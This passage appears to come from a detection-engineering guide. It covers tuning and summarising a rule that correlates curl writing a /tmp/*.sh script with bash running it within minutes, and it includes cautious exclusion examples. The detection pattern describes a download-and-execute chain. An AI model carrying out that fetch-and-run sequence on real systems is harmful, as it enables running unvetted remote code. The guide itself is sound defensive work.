- **T1059.003** – Command and Scripting Interpreter: Unix Shell, if `sh -c` is used

---

## Recommended Tuning

### Add Exclusions Only for Known Legitimate Activity

Do not blanket-exclude `/tmp/*.sh`. Legitimate installers sometimes use `/tmp`, and malware can reuse the same naming patterns.

If you must exclude, use highly specific allow-lists based on:

- Known file hashes
- Known parent process command lines
- Known deployment users
- Known script names used by approved automation

Example conservative exclusions:

```yaml
filter_known_deployment:
  CommandLine|contains:
    - '/tmp/deploy-2025-'
    - '/tmp/install-kubernetes-'
    - '/tmp/upgrade-security-'
```

Prefer environment-specific exclusions.

---

## Final Rule Summary

Use a temporal correlation rule:

```text
curl
  ->
creates or downloads
  ->
/tmp/*.sh
  ->
within minutes
  ->
bash /tmp/*.sh
```

Preferred correlation keys:

```text
host + user + script_path + time_window
```

Fallback correlation keys:

```text
host + user + time_window
```

Suggested time window:

```text
30 seconds to 5 minutes
```
